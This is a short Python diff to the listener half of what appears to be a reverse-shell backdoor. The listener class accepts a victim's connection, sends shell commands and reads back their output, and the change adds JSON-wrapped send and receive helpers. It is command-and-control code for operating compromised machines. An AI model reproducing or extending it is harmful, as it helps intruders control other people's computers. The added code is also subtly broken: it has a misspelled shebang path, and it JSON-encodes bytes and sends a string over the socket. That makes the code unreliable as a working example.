@@ -1,6 +1,7 @@
 #!/user/bin/env python
 import socket
 import errno
+import json
 
 
 class Listener:
@@ -13,13 +14,21 @@ class Listener:
         self.connection, address = listener.accept()
         print("\n[+] Got a connection.\n", str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+
     def execute(self, command):
         try:
-            self.connection.send(command.encode("utf-8"))
+            self.reliable_send(command.encode("utf-8"))
         except IOError as e:
             if e.errno == errno.EPIPE:
                 print("Something is error!" + str(e))
-        return self.connection.recv(1024)
+        return self.reliable_receive()
 
     def run(self):
         while True:
